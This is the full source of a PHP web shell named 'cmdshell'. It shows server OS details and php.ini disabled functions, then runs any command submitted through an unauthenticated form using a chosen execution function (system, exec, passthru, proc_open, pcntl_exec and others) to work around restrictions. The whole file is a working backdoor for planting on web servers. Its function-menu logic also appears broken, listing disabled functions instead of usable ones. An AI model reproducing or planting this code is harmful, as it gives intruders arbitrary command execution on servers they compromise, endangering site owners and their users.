<?php
    define('LINE','<br>');

    if (isset($_POST['encoding'])) {
        header('Content-Type: text/html; charset=' . $_POST['encoding']);
    }

    /**
     * 获取环境的基本信息
     */
    function show_basic() {
        $os = php_uname('s');
        $hostname = php_uname('n');
        $release = php_uname('r');
        $version = php_uname('v');

        echo '<pre>';
        echo 'OS: ' . $os . LINE;
        echo 'Hostname: ' . $hostname . LINE;
        echo 'Release: ' . $release . LINE;
        echo 'Version: ' . $version . LINE;
        echo '</pre>';
        echo '<hr>';
    }

    /**
     * 获取php.ini中被禁用的函数名
     * @param bool $display 是否显示disable_functions
     * @return false|string[]|void
     */
    function get_disable($display=false) {
        $func = ini_get('disable_functions');

        if (!$func) {
            if ($display) {
                echo 'No disabled functions found !' . LINE . LINE;
            }
            return;
        }

        $func = explode(',',$func);
        if ($display) {
            echo 'disable_functions: ';
            foreach ($func as $fun) {
                echo $fun . " ";
            }
        }
        return $func;
    }

    function generate_select() {
        echo '<select name="func">';
        $available = array('shell_exec','system','exec','passthru','popen','proc_open','pcntl_exec');
        $func = get_disable(false);
        if (!$func) {
            foreach ($available as $fun) {
                // 参数记忆
                if ($_POST['func'] == $fun) {
                    echo '<option selected>' . $fun . '</option>';
                    continue;
                }
                echo '<option>' . $fun . '</option>';
            }
        } else {
            foreach ($func as $fun) {
                if (!in_array($fun, $available)) {
                    echo '<option>' . $fun . '</option>';
                }
            }
        }
        echo '</select>';
    }
    /**
     * 执行命令并显示执行结果
     * @param $cmd 要执行的命令
     */
    function exec_and_display($func,$cmd) {
        echo '<pre>';
        switch ($func) {
            case 'shell_exec':
                echo shell_exec($cmd);
                return;
            case 'exec':
                exec($cmd,$res);
                foreach ($res as $line) {
                    echo $line . LINE;
                }
                return;
            case 'system':
                system($cmd);
                return;
            case 'passthru':
                passthru($cmd);
                return;
            case 'popen':
                $handle = popen($cmd, "r");
                echo stream_get_contents($handle);
                pclose($handle);
                return;
            case 'proc_open':
                $arr = array(
                    0 => array('pipe','r'),
                    1 => array('pipe','w'),
                );
                $process = proc_open($cmd,$arr,$pipes); // pipes 文件指针
                echo stream_get_contents($pipes[1]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                proc_close($process);
                return;
            case 'pcntl_exec':
                if (strpos(php_uname('s'),'dow')) {
                    // Pass Windows Environment
                    return;
                }
                $args = explode(' ',$cmd);
                array_unshift($args,'-c');
                $shell = '/bin/sh';
                pcntl_exec($shell,$args);
        }
        echo '</pre>';
    }
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>cmdshell</title>
</head>
<body>
<div>
    <!-- Show the required information -->
    <?php
        show_basic();
        get_disable(true);
    ?>
    <form method="post">
        <!-- Generate the available functions list -->
        <?php generate_select(); ?>
        <input type="text" name="cmd" placeholder="command" style="width: 200px">
        <select name="encoding">
            <option>utf-8</option>
            <option>gbk</option>
            <option>gb2312</option>
        </select>
        <input type="submit" value="exec">
    </form>
</div>
    <!-- Exec output -->
    <?php
        if ($_POST) {
            exec_and_display($_POST['func'],$_POST['cmd']);
        }
    ?>
</body>
</html>
